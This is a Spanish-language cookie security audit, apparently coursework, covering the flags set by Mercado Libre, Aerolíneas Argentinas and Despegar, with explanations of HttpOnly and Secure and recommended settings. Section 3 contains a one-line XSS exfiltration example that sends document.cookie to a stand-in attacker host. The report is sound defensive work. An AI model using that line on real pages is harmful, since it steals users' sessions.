# Objetivo 1 — Auditoría de Cookies y Banderas de Seguridad

**Fecha:** 21/10/2026
**Herramienta:** Firefox DevTools (`F12 → Almacenamiento → Cookies`)
**Sitios auditados:** Mercado Libre (`www.mercadolibre.com.ar`), Aerolíneas Argentinas (`www.aerolineas.com.ar`) y Despegar (`www.despegar.com.ar`)
**Condición de la prueba:** navegación pública, **sin sesión iniciada**

---

## 1. Metodología

1. Abrir el sitio y luego DevTools con `F12`. Ir a la pestaña **Almacenamiento → Cookies** y seleccionar el dominio del sitio.
2. Para cada cookie, registrar estas columnas:
   - **HttpOnly**
   - **Secure**
   - **SameSite**
   - **Expira / Tiempo máximo** ("Sesión" significa que la cookie no es persistente)
   - **Domain**
   - **Partition Key**
3. Clasificar cada cookie según su función:
   - **Seguridad o sesión:** identifica al usuario o protege contra ataques, por lo que es crítica.
   - **Funcional:** guarda preferencias.
   - **Analítica o publicidad:** rastreo de terceros.
4. Hacer la prueba práctica de HttpOnly desde la **Consola**:

```js
// Lista las cookies que JavaScript puede leer.
// Una cookie con HttpOnly NO debe aparecer acá.
document.cookie.split('; ').map(c => c.split('=')[0]);
```

5. Opcional: confirmar la cabecera real en **Red → petición del documento → Cabeceras de respuesta → `set-cookie`**.

**Criterio de evaluación:** toda cookie que actúe como **credencial o control de seguridad** debe tener **HttpOnly + Secure** y un `SameSite` explícito. En las cookies de analítica escritas por JavaScript, la ausencia de HttpOnly es inevitable, pero **Secure** debería estar siempre presente.

> **Alcance:** las capturas se hicieron sin iniciar sesión, por eso no aparecen las cookies de autenticación de usuario (por ejemplo, `ssid` en Mercado Libre). Para una auditoría completa hay que repetir el procedimiento con sesión iniciada.

---

## 2. Resultados

Leyenda: ✅ presente · ❌ ausente · *(vacío)* el atributo no está definido

### 2.1 Mercado Libre (`www.mercadolibre.com.ar`)

| Cookie | Función | HttpOnly | Secure | SameSite | Expira | Observación |
|---|---|---|---|---|---|---|
| `_csrf` | Token anti-CSRF ligado a la sesión del navegador | ✅ | ✅ | None | Sesión | Correcta. Es la cookie de seguridad del visitante |
| `_d2id` | Identificador de dispositivo (antifraude) | ❌ | ✅ | None | Nov 2027 | Legible por JS: un XSS podría exfiltrarlo |
| `_hjSession_*` | Sesión de analítica (Hotjar) | ❌ | ✅ | None | ~30 min | Aceptable: no es credencial |
| `_hjSessionUser_*` | Usuario de analítica (Hotjar) | ❌ | ✅ | None | Oct 2027 | Rastreo persistente (privacidad) |
| `_mldataSess*` | Sesión de métricas propias | ❌ | ✅ | None | Mismo día | Aceptable |
| `c_l2q2G` | Flag interno | ✅ | ✅ | None | Nov 2026 | Correcta |
| `cp` | Código postal (5000) | ✅ | ✅ | None | Nov 2026 | Correcta |
| `inferredZipc…` | Código postal inferido | ✅ | ✅ | None | Nov 2026 | Correcta |
| `g_state` | Estado del botón "Sign in with Google" | ❌ | **❌** | *(vacío)* | Abr 2027 | **Hallazgo** |

**Hallazgos:**
1. **`g_state` sin `Secure`** (severidad baja). Viaja también por HTTP plano. Solo guarda el estado de la interfaz de Google One Tap, pero debería marcarse Secure por consistencia.
2. **`SameSite=None` en todas las cookies** (informativo). Desactiva la defensa del navegador contra CSRF y obliga a depender del token `_csrf`, que está bien protegido. Es habitual en ecosistemas con varios dominios (Mercado Libre, Mercado Pago, `meli.com`), pero `Lax` sería preferible donde no haga falta compartir la cookie.
3. **`_d2id` sin `HttpOnly`** (bajo-medio). Es el identificador que usa el antifraude para reconocer el dispositivo. Si el front-end no necesita leerlo, debería ser HttpOnly.

**Veredicto:** ✅ **Aceptable, con hallazgos menores.** La cookie de seguridad está correctamente protegida. Las cookies sin HttpOnly son de analítica o identificadores, no credenciales. Casi todas tienen Secure.

### 2.2 Aerolíneas Argentinas (`www.aerolineas.com.ar`)

| Cookie | Función | HttpOnly | Secure | SameSite | Expira | Observación |
|---|---|---|---|---|---|---|
| `_fbp` | Píxel de Meta (publicidad) | ❌ | **❌** | *(vacío)* | Ene 2027 | Rastreo publicitario |
| `_ga` | Google Analytics: ID de cliente | ❌ | **❌** | *(vacío)* | Nov 2027 | Identificador persistente |
| `_ga_9J3EQ7JJ55` | Google Analytics 4: estado de sesión | ❌ | **❌** | *(vacío)* | Nov 2027 | Idem |
| `_gcl_au` | Google Ads: vinculación de conversiones | ❌ | **❌** | *(vacío)* | Ene 2027 | Idem |

**Análisis:**
- **No hay cookies propias de sesión ni de seguridad en la página pública.** Las cuatro cookies las crean scripts de terceros (Meta, Google) con `document.cookie`. Una cookie escrita desde JavaScript **no puede** tener HttpOnly, así que esa ausencia es esperable.
- **Ninguna tiene `Secure`** (severidad baja, impacto en privacidad). Ante cualquier petición `http://` al dominio, los identificadores de rastreo viajan en texto claro y un observador de la red puede correlacionar la navegación del usuario. Los scripts de Google y Meta se pueden configurar para agregar la bandera, por ejemplo con `cookie_flags: 'secure;samesite=lax'` en gtag.
- **`SameSite` sin definir.** El comportamiento queda librado al navegador: Chrome lo trata como `Lax`, pero Firefox, que es el navegador de la captura, lo trata como `None`. Debe declararse de forma explícita.
- **Las cookies publicitarias se crearon antes del consentimiento.** El banner todavía ofrecía "Aceptar" o "Aceptar solo las esenciales", y las cookies ya existían. No es una falla de las banderas, pero sí un hallazgo de privacidad: el usuario debería poder rechazarlas antes de que se generen.

**Veredicto:** ⚠️ **Mejorable.** Es el sitio con peor configuración de banderas: 0 de 4 cookies con Secure y ninguna con SameSite explícito.

### 2.3 Despegar (`www.despegar.com.ar`)

Entre las dos capturas se ven **32 cookies** del dominio. También se observan cookies de terceros: `antifraud.koinlatam.com`, `doubleclick.net`, `accounts.google.com` y `useinsider.com`.

**a) Cookies de seguridad y sesión**

| Cookie | Función | HttpOnly | Secure | SameSite | Expira | Observación |
|---|---|---|---|---|---|---|
| `__cf_bm` | Cloudflare Bot Management | ✅ | ✅ | None | ~30 min | Correcta |
| `cf_clearance` | Cloudflare: constancia de que el navegador superó el desafío anti-bot | ✅ | ✅ | None | Oct 2027 | Correcta. Además está **particionada (CHIPS)** |
| `_gtmeec` | Google Tag Manager (conversiones mejoradas, del lado del servidor) | ✅ | ✅ | **Strict** | Ene 2027 | Configuración ejemplar |
| `FPID` | Google: ID first-party emitido por el servidor (GTM del lado del servidor) | ✅ | ✅ | *(vacío)* | Nov 2027 | Correcta en HttpOnly y Secure; falta un SameSite explícito |
| `__sessionI…` | Identificador de sesión del sitio | **❌** | ✅ | None | 24 h | **Hallazgo principal.** También está particionada |
| `datadome` | DataDome (anti-bot) | ❌ | ✅ | Lax | Oct 2027 | El script de DataDome necesita leerla; es esperable |

**b) Cookies de analítica y publicidad**

| Cookie | Proveedor | HttpOnly | Secure | SameSite |
|---|---|---|---|---|
| `_rtbh.aid`, `_rtbh.lid` | RTB House (retargeting) | ❌ | ✅ | None |
| `_hjSession…` (×2) | Hotjar | ❌ | ✅ | None |
| `_fbp` (`www.`) | Meta | ❌ | ✅ | Lax |
| `FPAU` | Google Ads | ❌ | ✅ | *(vacío)* |
| `FPGSID` | Google (sesión first-party) | ❌ | ✅ | Strict |
| `FPLC` | Google (vinculación entre dominios) | ❌ | ✅ | *(vacío)* |
| `_fbp` (`.despegar…`) | Meta | ❌ | **❌** | *(vacío)* |
| `trackerid` (×2), `trackeam…` | Rastreo propio de Despegar | ❌ | **❌** | *(vacío)* |
| `xdesp-ra…` | Propia de Despegar | ❌ | **❌** | *(vacío)* |
| `g_state` | Botón "Sign in with Google" | ❌ | **❌** | *(vacío)* |
| `ttcsid`, `ttcsid_CM…` | TikTok | ❌ | **❌** | *(vacío)* |
| `_clck`, `_clsk` | Microsoft Clarity | ❌ | **❌** | *(vacío)* |
| `_ga`, `_ga_84NL…`, `_gcl_au` | Google Analytics / Ads | ❌ | **❌** | *(vacío)* |
| `_pin_unauth` | Pinterest | ❌ | **❌** | *(vacío)* |
| `_tt_enable_cookie`, `_ttp` | TikTok | ❌ | **❌** | *(vacío)* |
| `_uetsid`, `_uetvid` | Microsoft Ads (Bing) | ❌ | **❌** | *(vacío)* |

**Hallazgos:**
1. **`__sessionI…` sin `HttpOnly`** (severidad media, a confirmar). Por su nombre es un identificador de sesión, y cualquier script de la página puede leerlo con `document.cookie`. Con más de 15 scripts de terceros cargados, la superficie de ataque es alta: un XSS o un script de terceros comprometido (ataque a la cadena de suministro) podría exfiltrarlo. Que tenga Secure y esté particionada mitiga otros vectores, pero no este.
   - **Observación entre capturas:** el valor cambió de `992e8fc5…` a `7eb9ed16…` en unos 15 minutos, aunque la cookie declara una vigencia de 24 horas. Eso sugiere que se regenera con cada visita y que posiblemente la escribe JavaScript. En ese caso sería un identificador de sesión de navegación o analítica, no una credencial.
   - **Para cerrarlo:** iniciar sesión y verificar si este valor queda vinculado al usuario autenticado. Si es así, el hallazgo sube a **alto**.
2. **18 de 32 cookies sin `Secure`** (severidad baja, impacto en privacidad). Incluyen identificadores de rastreo de Google, Microsoft, Pinterest, TikTok y Meta, y también **identificadores propios de Despegar** (`trackerid`, `trackeam…`). Todos pueden viajar sin cifrar.
3. **Configuración inconsistente.** `_fbp` y `trackerid` aparecen **duplicadas**, una vez en `www.despegar…` y otra en `.despegar…`. En el caso de `_fbp`, cada copia tiene banderas distintas: una tiene Secure y Lax, la otra ninguna de las dos. Indica que distintas integraciones escriben la misma cookie, lo que suele generar errores.
4. **Fortaleza:** las cookies de la capa de seguridad perimetral están muy bien configuradas. Las de Cloudflare y de GTM del lado del servidor (`__cf_bm`, `cf_clearance`, `_gtmeec`, `FPID`) usan HttpOnly y Secure, y además `SameSite=Strict` en `_gtmeec` y particionado CHIPS en `cf_clearance`.

**Veredicto:** ⚠️ **Mejorable, con un hallazgo de severidad media.** Despegar tiene las cookies mejor configuradas de los tres sitios (las de Cloudflare y GTM), pero también la peor: un identificador de sesión legible por JavaScript en una página con una gran cantidad de scripts de terceros.

### 2.4 Resumen comparativo

| Sitio | Cookies de seguridad con HttpOnly | Cobertura de Secure | SameSite | Hallazgo más grave | Nota |
|---|---|---|---|---|---|
| Mercado Libre | ✅ (`_csrf`) | 8 de 9 | None en todas | `g_state` sin Secure | ✅ Aceptable |
| Aerolíneas Argentinas | No observadas | **0 de 4** | Sin definir | Ninguna cookie con Secure, y cookies instaladas antes del consentimiento | ⚠️ Mejorable |
| Despegar | ✅ las de Cloudflare y GTM (4) / **❌ `__sessionI…`** | 14 de 32 | Mixto | Identificador de sesión legible por JS | ⚠️ Mejorable (medio) |

---

## 3. ¿Qué protege exactamente la bandera `HttpOnly`?

`HttpOnly` impide que **JavaScript del lado del cliente** lea o modifique la cookie. Con esta bandera, la cookie no aparece en `document.cookie` ni en las APIs del navegador accesibles desde scripts. El navegador la sigue enviando automáticamente en cada petición HTTP al dominio.

**Lo que protege:** la **confidencialidad del token de sesión frente al robo por XSS** (Cross-Site Scripting). Si un atacante logra inyectar un script en la página, no puede ejecutar algo como esto para llevarse la sesión y reutilizarla desde su propia máquina (*session hijacking*):

```js
fetch('https://atacante.com/?c=' + document.cookie)
```

Es exactamente el riesgo que corre `__sessionI…` en Despegar.

**Lo que NO protege:**
- **No evita el XSS.** El script inyectado puede seguir haciendo peticiones en nombre del usuario desde su navegador, y la cookie viaja sola. HttpOnly impide la *exfiltración* del token, no el *abuso en el lugar*.
- **No protege contra CSRF.** Para eso existen `SameSite` y los tokens anti-CSRF, como `_csrf` en Mercado Libre.
- **No cifra la cookie en tránsito.** Eso depende de `Secure` y HTTPS.

---

## 4. ¿Qué riesgo corre el usuario si la cookie de sesión no tiene `Secure`?

Sin `Secure`, el navegador **envía la cookie también por HTTP plano, sin cifrar**. Alcanza con una sola petición `http://` al dominio para que el token viaje en texto claro. Esa petición puede venir de un enlace viejo, de una imagen embebida, de que el usuario escriba el dominio sin `https://`, o de un atacante que la provoque a propósito.

**Riesgo concreto: secuestro de sesión (*session hijacking*) por intercepción.**
- En una **red Wi-Fi pública** (bar, aeropuerto, facultad), un atacante en la misma red puede capturar el tráfico con herramientas como Wireshark. También puede hacer un ataque *Man-in-the-Middle*, por ejemplo con ARP spoofing o un punto de acceso falso, y leer la cookie.
- Con la cookie copiada, **se hace pasar por el usuario sin necesitar contraseña ni segundo factor**, porque el 2FA ya se validó al iniciar sesión. En sitios como los auditados podría ver reservas y datos personales (DNI, pasaporte), usar medios de pago guardados, canjear millas o cambiar el correo de la cuenta para quedarse con ella.
- El ataque es **silencioso**: la víctima no ve ningún error.
- Un antecedente histórico es **Firesheep (2010)**, una extensión que automatizaba este robo en redes Wi-Fi abiertas contra sitios como Facebook y Twitter.

**Mitigación completa:** `Secure` + **HSTS** (`Strict-Transport-Security`) para que el navegador nunca use HTTP + prefijo `__Host-` en la cookie de sesión.

---

## 5. Configuración recomendada para una cookie de sesión

```http
Set-Cookie: __Host-session=<token-aleatorio>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Atributo | Mitiga |
|---|---|
| `HttpOnly` | Robo de la sesión vía XSS |
| `Secure` | Intercepción en tránsito (sniffing, MITM) |
| `SameSite=Lax/Strict` | CSRF |
| `__Host-` | Que un subdominio comprometido escriba o fije la cookie (*cookie tossing*, *session fixation*) |
| `Max-Age` corto + rotación al iniciar sesión | Ventana de explotación de un token robado |

**Recomendaciones puntuales:**
- **Despegar:** emitir `__sessionI…` desde el servidor con `HttpOnly`, agregar `Secure` a los identificadores propios (`trackerid`, `trackeam…`) y unificar la escritura de las cookies duplicadas (`_fbp`, `trackerid`).
- **Aerolíneas Argentinas:** configurar `cookie_flags: 'secure;samesite=lax'` en gtag y en el píxel de Meta, y cargar los scripts de publicidad recién después del consentimiento.
- **Mercado Libre:** agregar `Secure` a `g_state` y evaluar `SameSite=Lax` en las cookies que no necesitan compartirse entre dominios.

---

## 6. Conclusión

Ninguno de los tres sitios expone una cookie de autenticación sin `Secure`. Sí aparecen tres niveles de madurez distintos:

- **Mercado Libre** tiene la configuración más consistente: Secure en casi todas las cookies y un token anti-CSRF bien protegido.
- **Aerolíneas Argentinas** delega todo en scripts de terceros sin endurecer: ninguna cookie tiene Secure ni SameSite explícito.
- **Despegar** muestra el contraste más interesante. Su capa perimetral (Cloudflare, GTM del lado del servidor) usa prácticas avanzadas como `SameSite=Strict` y CHIPS. Al mismo tiempo, deja un identificador de sesión legible por JavaScript en una página que carga más de 15 scripts de terceros.

HttpOnly y Secure se complementan: la primera protege el token **dentro del navegador** (contra XSS) y la segunda lo protege **en la red** (contra la intercepción). Ninguna de las dos alcanza por sí sola. Se deben combinar con SameSite, HSTS y un manejo correcto del ciclo de vida de la sesión.
